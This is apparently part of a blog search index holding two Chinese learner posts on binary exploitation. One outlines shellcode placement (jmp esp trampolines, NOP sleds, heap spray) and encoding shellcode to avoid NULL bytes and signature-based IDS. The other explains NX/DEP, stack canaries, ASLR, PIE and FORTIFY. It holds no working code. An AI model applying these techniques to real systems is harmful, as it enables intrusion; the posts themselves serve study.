      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><h1 id="shellcode布置"><a href="#shellcode布置" class="headerlink" title="shellcode布置"></a>shellcode布置</h1><ol><li><p>将shellcode放在缓冲区中（静态地址），即函数返回地址之前。//shellcode自身可能会被压栈数据破坏，难以动态定位</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片1-2.png" alt="1" title="" class="">                <p>1</p>            </figure></li><li><p>使用jmp esp/call esp 指令作为跳板指令，定位shellcode，使shellcode正好布置在返回地址之后。//前栈帧数据被大范围破坏</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片2-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>为尽量避免1,2的缺点，可以使用跳转指令定位shellcode，同时将shellcode布置在缓冲区内。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片3-1.png" alt="3" title="" class="">                <p>3</p>            </figure></li><li><p>为了使shellcode具有通用性/安全性，通常会在shellcode一开始大范围抬高栈顶，保护自身代码的完整性。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片4-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>某些情况下不允许使用跳板指令，静态地址又不够准确。可以淹没大片内存的情况下，将shellcode布置在一大段nop之后。此时定位shellcode时，只要能够跳进一大片nop之中即可。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片5-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>返回地址距离缓冲区偏移量不确定。若函数返回地址按双字节不定，可以用一片连续的跳转指令的地址来覆盖函数返回地址，只要有其中一个可以成功覆盖，shellcode就能执行。（待理解）</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片7-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>按字节错位引起定位失败从而使shellcode无效。使用按字节相同的双字跳转地址，甚至使用堆中的地址，将shellcode用堆扩展的方法放置在相应区域（Heap spray）。（待理解）</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片8-1.png" alt="2" title="" class="">                <p>2</p>            </figure><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片8-2.png" alt="2" title="" class="">                <p>2</p>            </figure></li></ol><h1 id="shellcode的编码技术"><a href="#shellcode的编码技术" class="headerlink" title="shellcode的编码技术"></a>shellcode的编码技术</h1><ul><li>原因：</li></ul><ol><li><p>所有的字符串函数都会对NULL字节进行限制，通常需要在shellcode中选择特殊的指令避免直接出现NULL字节或字。</p></li><li><p>有些函数还会要求shellcode必须为可见字符的ASCII值或Unicode值。</p></li><li><p>基于特征的IDS系统往往会对常见的shellcode进行拦截。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片9-1.png" alt="2" title="" class="">                <p>2</p>            </figure><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片10-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li></ol><ul><li><p>解决：</p><p>编码。先编码使内容达到限制的要求，再构造解码程序放在shellcode开始执行的地方。</p></li></ul>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn0.0 --Protection technology</title>
      <link href="/2018/05/13/protection-technology/"/>
      <url>/2018/05/13/protection-technology/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><h1 id="NX保护和DEP保护"><a href="#NX保护和DEP保护" class="headerlink" title="NX保护和DEP保护"></a>NX保护和DEP保护</h1><p>两个保护措施都有相同点，都是使数据与代码分离，防止恶意代码被执行简单来说就是关闭了堆栈执行权限</p><h2 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h2><p>NX保护，全称为 “No eXecute” ，意为 [禁止执行]<br>我对它的理解即为栈上数据区域去除执行权限，就能防止大多数溢出攻击，即一些恶意程式，把自身的恶意指令集放在其他程式的数据储存区并执行。</p><p>linux最早的漏洞防护机制nx-stack刚刚出现后就有人想出了突破方法。那就是只有栈是不可执行，而除了栈以外的其他地方还是可以执行的，只要把返回地址执行别的地方就可以。</p><h2 id="DEP保护"><a href="#DEP保护" class="headerlink" title="DEP保护"></a>DEP保护</h2><p>DEP保护，全称为 Data Execution Prevention ，意为 数据执行保护</p><p>数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码</p><p>主要优点<br>我觉得这种保护技术组要应用于Windows</p><p>这种技术的保护方式和NX方式有相同的地方，也就是让堆和堆栈上的内容不可执行。 可帮助防止数据页当作代码执行，从而有效分离数据与代码。可写的不可执行，可执行的不可写。<br>百度百科上有这样一句话：</p><p>可以说，溢出是操作系统(应用软件)永远的痛，Windows 7自然也不例外。所谓溢出主要指缓冲区溢出，就是利用系统(应用软件)漏洞从只有Windows和其他程序可以使用的内存位置执行恶意代码从而达到控制系统的目的。如前所述，缓冲区溢出攻击经常在其它程序的内存缓冲区写入可执行的恶意代码，然后诱骗程序执行恶意代码。使用DEP的目的是阻止恶意插入代码的执行，其运行机制是，Windows利用DEP标记只包含数据的内存位置为非可执行(NX)，当应用程序试图从标记为NX的内存位置执行代码时，Windows的DEP逻辑将阻止应用程序这样做，从而达到保护系统防止溢出。</p><p>*P.S.好像这部分还分为硬件实施DEP和软件实施DEP，这个坑先留着吧，过些日子理解之后我再来填。</p><h1 id="Linux-Canary保护"><a href="#Linux-Canary保护" class="headerlink" title="Linux Canary保护"></a>Linux Canary保护</h1><p>Canary ，又名 金丝雀 ，是一个防止溢出修改ret的措施， Canary 是Linux众多安全保护机制中的一种，主要用于 防护栈溢出攻击 。我们知道，在32位系统上，对于栈溢出漏洞，攻击者通常是通过 溢出栈缓冲区 ， 覆盖栈上保存的函数返回地址 来达到 劫持程序执行流 的目的：<br>溢出栈缓冲区<br>劫持方式</p><figure class="image-box">                <img src="/2018/05/13/protection-technology/1.jpg" alt="1" title="" class="">                <p>1</p>            </figure><p>如上图所示我们只要能够精确计算出需要覆盖的长度是多少，就能精确覆盖ret的地址，达到攻击效果。<br>然而，针对此种攻击情况，如果在函数返回之前，我们能够判断ret地址是否被改写，若被改写则终止程序的执行，便可以有效地应对攻击。如何做到呢？一个很自然的想法是在刚进入函数时，在栈上放置一个标志，在函数结束时，判断该标志是否被改变，如果被改变，则表示有攻击行为发生。 Linux Canary保护机制 便是如此，如下：</p><figure class="image-box">                <img src="/2018/05/13/protection-technology/2.jpg" alt="1" title="" class="">                <p>1</p>            </figure><p>攻击者如果要通过栈溢出覆盖ret，则必先覆盖Canary。如果我们能判断Canary前后是否一致，便能够判断是否有攻击行为发生。</p><p>注：上述图例仅用于说明，实际上canary并不一定是与栈上保存的BP地址相邻的。</p><h1 id="ASLR地址空间布局随机化"><a href="#ASLR地址空间布局随机化" class="headerlink" title="ASLR地址空间布局随机化"></a>ASLR地址空间布局随机化</h1><p>ASLR ，全称为 Address space layout randomization<br>顾名思义，这个保护措施的主要内容就是把地址给随机化了，用以增加攻击者对地址预测的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。</p><p>但是这个措施只是能降低缓冲区溢出攻击的成功率，并不是能完全防止溢出。</p><p>关于这个，多的我也说不上来，给几个文章的地址吧。</p><h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>PIE ，全称为 position-independent executables<br>一般情况下NX和地址空间分布随机化会同时工作。在linux下内存空间随机化被称作PIE。</p><p>内存地址随机化机制，有以下三种情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参数 意义</span><br><span class="line">0 表示关闭进程地址空间随机化</span><br><span class="line">1 表示将mmap的基址，stack和vdso页面随机化</span><br><span class="line">2 表示在1的基础上增加栈（heap）的随机化</span><br></pre></td></tr></table></figure><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。<br><em>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</em></p><h1 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h1><p>这个好像是编译器的保护措施，将函数名改变了，从而达到防止缓冲区溢出的作用。具体的坑emmm等我以后学会了些再来填吧。</p><p>系统防护（全）：<br><a href="http://www.mamicode.com/info-detail-1990426.html" title="1" target="_blank" rel="noopener">二进制的保护机制</a><br><a href="https://blog.csdn.net/x_nirvana/article/details/61420056" title="2" target="_blank" rel="noopener">WINDOWS和LINUX的内存防护机制</a></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tech </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
